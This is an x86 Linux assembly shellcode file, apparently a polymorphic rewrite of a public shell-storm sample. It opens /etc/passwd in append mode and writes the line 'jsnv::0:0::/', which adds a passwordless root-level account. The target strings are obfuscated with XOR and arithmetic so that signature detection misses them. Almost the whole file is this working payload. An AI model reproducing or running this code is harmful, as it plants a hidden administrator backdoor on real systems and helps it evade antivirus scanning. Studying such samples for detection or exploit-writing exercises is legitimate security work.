; Polymorphic version of http://shell-storm.org/shellcode/files/shellcode-211.php
global _start

section .text

_start:
  ; open('/etc//passwd', O_WRONLY | O_APPEND)
  push byte 0x5                 ; open(2)
  mov eax, [esp]                ; eax = 0x5
  pop ecx                       ; ecx = 0x5
  xor ecx, 0x5                  ; clear ecx
  push ecx                      ; push NULL
  push ecx                      ; push NULL
  mov dword [esp], 0x2d3ffc2d   ; overwrite the recent null in stack
  add dword [esp], 0x37377746   ; esp value = 'sswd'
  mov ebx, dword [esp]          ; ebx = 'sswd'
  push ebx                      ; esp value = 'sswd'
  xor dword [esp], 0x5075c5c    ; esp value is now '//pa' after xor
  sub ebx, 0x1030e44            ; ebx = '/etc'
  push ebx                      ; esp value = '/etc'
  mov ebx, esp                  ; ebx = esp address
  inc cl                        ; ecx = 0x1
  mov ch, 0x4                   ; ecx = (00000001 | 00002000) = 0x401; source: /usr/include/asm-generic/fcntl.h
  int 0x80                      ; syscall open(2)

  ; write(fd, esp, size);
  xchg ebx, eax                 ; ebx = fd; eax = esp address
  xchg eax, ecx                 ; ecx = esp address; eax = 0x401
  sub ax, 0x3fd                 ; eax = 0x4; write(2)
  xor edx, edx                  ; clear edx
  push edx                      ; push NULL
  mov edx, 0x4c4e5f1f           ; prepare edx for  '0::/'
  xor edx, [esp+4]              ; edx = '0::/'
  push edx                      ; esp value  = '0::/'
  xor edx, 0x5954495a           ; edx = 'jsnv'
  mov ecx, edx                  ; ecx = 'jsnv'
  sub edx, 0x3c3e3930           ; edx = '::0:'
  push edx                      ; esp value = '::0:'
  push ecx                      ; esp value = 'jsnv'
  mov ecx, esp                  ; ecx = esp address
  push byte 0xc                 ; size = 12
  pop edx                       ; edx = size
  int 0x80                      ; syscall write(2)

  ; close
  mov al, 0x6                   ; close(2)
  int 0x80                      ; syscall close(2)

  ; exit
  xor eax, eax                 ; clear eax
  inc eax                      ; eax = 0x1
  int 0x80                     ; syscall _exit(2)
